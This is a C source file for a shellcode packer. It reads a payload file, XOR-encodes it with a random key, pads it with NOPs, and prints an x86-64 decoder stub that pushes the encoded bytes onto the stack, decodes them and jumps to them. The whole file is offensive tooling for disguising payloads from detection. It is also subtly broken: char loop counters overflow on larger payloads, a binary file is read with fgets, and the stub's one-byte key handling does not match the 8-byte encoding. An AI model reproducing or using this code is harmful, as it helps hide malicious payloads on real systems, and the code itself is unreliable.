#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>


typedef struct{
    char *shellcode_ptr;
    int   shellcode_size;
} shellcode_attr;


void fatal_msg(char *msg){
    fprintf(stderr, "%s\n", msg);
    exit(1);
}


shellcode_attr read_payload(char *filename){
    struct stat st;
    shellcode_attr shellcode;
    stat(filename, &st);
    long size = st.st_size;
    FILE *fd = fopen(filename, "r");
    if (fd == NULL) {
        fatal_msg(strerror(errno));
    }
    
    char *cptr = (char*)malloc(size);
    if (cptr == NULL){
        fatal_msg(strerror(errno));
    }
    fgets(cptr, size, fd);
    fclose(fd);
    shellcode.shellcode_ptr = cptr;
    shellcode.shellcode_size = size;

    return shellcode;
    
}

void iterate_shellcode(shellcode_attr shell_attr){
    for (char i=0; i<shell_attr.shellcode_size; i++){
        printf("\\x%02hhx", shell_attr.shellcode_ptr[i]);
    }
}



void pack_code(shellcode_attr shell_attr, char key[]){
    while (shell_attr.shellcode_size % 8 != 0){
        shell_attr.shellcode_size++;
    }
    printf("[ DEBUG ] shellcode size: %d\n", shell_attr.shellcode_size);
    printf("[ DEBUG ] KEY: %lx\n", *(unsigned long*)key);
    for(char i=0; i<shell_attr.shellcode_size; i += 8){
        *(unsigned long*)(shell_attr.shellcode_ptr+i) ^= *(unsigned long*)(key);
    }
}


int check_bytes(shellcode_attr shell_attr){
    int shell_exec_flag = 1;
    for (char i=0; i<shell_attr.shellcode_size; i++){
        if (shell_attr.shellcode_ptr[i] == 0){
            printf("[!] Found null byte at index: %d\n", i);
            shell_exec_flag= 0;
        }
    }
    return shell_exec_flag;
    

}


int align_shellcode(shellcode_attr shell_attr){
    char *pad = "\x90";
    int new_size;
    for (char i = shell_attr.shellcode_size; i % 16 != 0; i++){
        shell_attr.shellcode_ptr[i] = *pad;
        new_size = i;
    }
    new_size++;
    return new_size;

}

int build_shellcode(shellcode_attr shell_attr, char key[]){
    // phase A - push the packed shellcode into the stack...
    int new_size = shell_attr.shellcode_size+(shell_attr.shellcode_size/8*3)+38;
    char full_buf[new_size];
    char *ptr = full_buf;
    char *ptrshellcode = &shell_attr.shellcode_ptr[shell_attr.shellcode_size-8];
    strncpy(ptr, "\x55\x48\x89\xe5\x48\x83\xec", 7);
    ptr++;
    (*ptr++) = new_size;
    for (char i = shell_attr.shellcode_size+1-8; i >= 0; i -= 8, ptrshellcode -= 8){
        (*ptr++) = '\x48';
        (*ptr++) = '\xb8';
        strncpy(ptr, ptrshellcode, 8);
        ptr += 8;
        (*ptr++) = '\x50';

    }
    // phase B - init vars (xor rcx, rcx)
    strncpy(ptr, "\x48\x31\xc9", 3);
    ptr += 3;

    // mov the key to r8b
    (*ptr++) = '\x41';
    (*ptr++) = '\xb0';
    *(unsigned long *)(ptr++) = *(unsigned long*)key;


    // phase C - start decoding
    strncpy(ptr, "\x44\x8a\x14\x0c\x45\x30\xc2\x44\x88\x14\x0c\x48\xff\xc1", 14);
    ptr += 14;

    // cmp with the size if we are done, if not continue decoding...
    (*ptr++) = '\x48';
    (*ptr++) = '\x83';
    (*ptr++) = '\xf9';
    (*ptr++) = shell_attr.shellcode_size;

    (*ptr++) = '\x75';
    (*ptr++) = '\xec';

    // phase D - we are done jmp to the beginning of our decoded shellcode
    strncpy(ptr, "\x48\x89\xe3\xff\xe3" ,5);
    for (char i=0; i<new_size; i++){
        printf("\\x%0.2hhx", full_buf[i]);
    }
    return new_size;

}

void generate_key(char key[]){
    // Generate 8 byte key for shellcode encoding
    srand (time(NULL));
    for (int i=0; i<8; i++){
        key[i] = rand() % 95 + 32;
    }  
}


int main(){
    char filename_str[30];
    char key[8] = {0};
    printf("Enter shellcode filename: ");
    if ( fgets(filename_str, sizeof(filename_str), stdin) == NULL ){
        fatal_msg(strerror(errno));
    }
    filename_str[strcspn(filename_str, "\n")] = 0;
    shellcode_attr shell_attr = read_payload(filename_str);
    // printf("Enter char for encoding: ");
    // int input_enc = getc(stdin);
    generate_key(key);
    puts("[+] Original shellcode: ");
    iterate_shellcode(shell_attr);
    printf("\n[+] Original shellcode size: %d\n", shell_attr.shellcode_size);
    pack_code(shell_attr, key);
    puts("[+] shellcode After packing (without stub): ");
    iterate_shellcode(shell_attr);
    int flag = check_bytes(shell_attr);
    if (!flag){
        fatal_msg("[-] Packed shellcode contains NULL bytes, cant be executed use a different key\n");
    }
    int new_size = align_shellcode(shell_attr);
    shell_attr.shellcode_size = new_size;
    puts("[+] Generated full shellcode (with stub)");
    int full_shellcode_size = build_shellcode(shell_attr, key);
    shell_attr.shellcode_size = full_shellcode_size;
    puts("");
    printf("[+] Full shellcode size: %d\n", full_shellcode_size);
}